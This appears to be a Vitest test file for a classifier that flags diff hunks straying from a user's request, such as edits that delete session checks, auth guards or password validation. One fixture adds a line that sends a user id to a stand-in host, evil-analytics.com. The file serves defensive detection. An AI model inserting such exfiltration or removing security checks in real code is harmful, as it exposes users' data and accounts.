import { describe, it, expect } from 'vitest';
import { classifyHunks } from '../src/engine/classifier.js';
import { DiffHunk } from '../src/types.js';

describe('Phase 4: Intent Classifier & Destructive Target Matching', () => {

  it('C01 & C02: Distinguishes authorized toggle from collateral grid mutation', () => {
    const prompt = 'Add a dark mode toggle';
    const hunks: DiffHunk[] = [
      {
        id: 'h1',
        beforeStartLine: 5,
        beforeLineCount: 0,
        afterStartLine: 5,
        afterLineCount: 3,
        deletedLines: [],
        addedLines: ['<DarkModeToggle />'],
        enclosingSymbol: 'function Navbar()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: true
      },
      {
        id: 'h2',
        beforeStartLine: 20,
        beforeLineCount: 1,
        afterStartLine: 23,
        afterLineCount: 1,
        deletedLines: ['grid-template-columns: repeat(3, 1fr);'],
        addedLines: ['grid-template-columns: repeat(2, 1fr);'],
        enclosingSymbol: '.dashboard-grid',
        status: 'COLLATERAL_MUTATION',
        impactSummary: '',
        accepted: false
      }
    ];

    const classified = classifyHunks(prompt, hunks);
    expect(classified[0].status).toBe('AUTHORIZED');
    expect(classified[1].status).toBe('COLLATERAL_MUTATION');
  });

  it('C04: Catches deleted API timeout as INVARIANT_BREACH despite prompt currency keyword', () => {
    const prompt = 'Format currency to two decimals';
    const hunks: DiffHunk[] = [
      {
        id: 'h1',
        beforeStartLine: 15,
        beforeLineCount: 1,
        afterStartLine: 15,
        afterLineCount: 0,
        deletedLines: ['timeout: 5000,'],
        addedLines: [],
        enclosingSymbol: 'function checkout()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: false
      }
    ];

    const classified = classifyHunks(prompt, hunks);
    expect(classified[0].status).toBe('INVARIANT_BREACH');
    expect(classified[0].impactSummary).toContain('Deleted critical');
  });

  it('C06: Catches deleted session verification as INVARIANT_BREACH during CSV export feature addition', () => {
    const prompt = 'Add CSV export button';
    const hunks: DiffHunk[] = [
      {
        id: 'h1',
        beforeStartLine: 2,
        beforeLineCount: 1,
        afterStartLine: 2,
        afterLineCount: 0,
        deletedLines: ['await verifySession(req);'],
        addedLines: [],
        enclosingSymbol: 'function handleExport()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: false
      }
    ];

    const classified = classifyHunks(prompt, hunks);
    expect(classified[0].status).toBe('INVARIANT_BREACH');
  });

  it('C08: Distraction Defense: Header prompt does NOT authorize deletion of header security check', () => {
    const prompt = 'Fix the header layout';
    const hunks: DiffHunk[] = [
      {
        id: 'h1',
        beforeStartLine: 1,
        beforeLineCount: 2,
        afterStartLine: 1,
        afterLineCount: 0,
        deletedLines: ['if (!user.isAuthenticated) {', '  throw new AuthError();'],
        addedLines: [],
        enclosingSymbol: 'function Header()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: false
      }
    ];

    const classified = classifyHunks(prompt, hunks);
    // Must be flagged as INVARIANT_BREACH, not AUTHORIZED!
    expect(classified[0].status).toBe('INVARIANT_BREACH');
  });

  it('C10: Empty prompt returns UNCERTAIN status and demands manual review', () => {
    const hunks: DiffHunk[] = [
      {
        id: 'h1',
        beforeStartLine: 1,
        beforeLineCount: 1,
        afterStartLine: 1,
        afterLineCount: 1,
        deletedLines: ['const x = 1;'],
        addedLines: ['const x = 2;'],
        enclosingSymbol: 'const x',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: true
      }
    ];

    const classified = classifyHunks('   ', hunks);
    expect(classified[0].status).toBe('UNCERTAIN');
    expect(classified[0].impactSummary).toContain('Empty or unguided prompt');
  });

  it('4C: Mismatched destructive intent: "Remove spinner" does NOT authorize deleting session verification', () => {
    const prompt = 'Remove the loading spinner';
    const hunks: DiffHunk[] = [
      {
        id: 'h1',
        beforeStartLine: 10,
        beforeLineCount: 2,
        afterStartLine: 10,
        afterLineCount: 0,
        deletedLines: ['<Spinner />'],
        addedLines: [],
        enclosingSymbol: 'function View()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: true
      },
      {
        id: 'h2',
        beforeStartLine: 25,
        beforeLineCount: 2,
        afterStartLine: 23,
        afterLineCount: 0,
        deletedLines: ['if (!session.isValid) {', '  return redirect("/login");'],
        addedLines: [],
        enclosingSymbol: 'function AuthCheck()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: false
      }
    ];

    const classified = classifyHunks(prompt, hunks);
    expect(classified[0].status).toBe('AUTHORIZED'); // Spinner removal authorized
    expect(classified[1].status).toBe('INVARIANT_BREACH'); // Auth deletion blocked!
  });

  it('False Alarm Defense: Semantic terminology ("Implement dark theme palette") correctly authorizes theme additions', () => {
    const prompt = 'Implement dark theme palette';
    const hunks: DiffHunk[] = [
      {
        id: 'h1',
        beforeStartLine: 1,
        beforeLineCount: 0,
        afterStartLine: 1,
        afterLineCount: 2,
        deletedLines: [],
        addedLines: ['.theme-dark { background: #000; }'],
        enclosingSymbol: 'rule .theme-dark',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: true
      }
    ];

    const classified = classifyHunks(prompt, hunks);
    expect(classified[0].status).toBe('AUTHORIZED');
  });

  it('Missed Collateral Defense: Generic prompt keyword ("user") does NOT authorize tracking script or password validator deletion', () => {
    const prompt = 'Update user profile layout';
    const hunks: DiffHunk[] = [
      {
        id: 'h1',
        beforeStartLine: 10,
        beforeLineCount: 0,
        afterStartLine: 10,
        afterLineCount: 1,
        deletedLines: [],
        addedLines: ['<div className="user-profile-grid">...</div>'],
        enclosingSymbol: 'function UserProfile()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: true
      },
      {
        id: 'h2',
        beforeStartLine: 40,
        beforeLineCount: 2,
        afterStartLine: 41,
        afterLineCount: 0,
        deletedLines: ['if (user.password.length < 8) {', '  throw new Error("Weak password");'],
        addedLines: [],
        enclosingSymbol: 'function validateUserPassword()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: false
      },
      {
        id: 'h3',
        beforeStartLine: 60,
        beforeLineCount: 0,
        afterStartLine: 59,
        afterLineCount: 1,
        deletedLines: [],
        addedLines: ['fetch("https://evil-analytics.com/track?user=" + user.id);'],
        enclosingSymbol: 'function sendAnalytics()',
        status: 'AUTHORIZED',
        impactSummary: '',
        accepted: false
      }
    ];

    const classified = classifyHunks(prompt, hunks);
    expect(classified[0].status).toBe('AUTHORIZED'); // Layout is authorized
    expect(classified[1].status).toBe('INVARIANT_BREACH'); // Validation deletion is strictly blocked!
    expect(classified[2].status).toBe('COLLATERAL_MUTATION'); // Injected analytics is flagged collateral!
  });
});
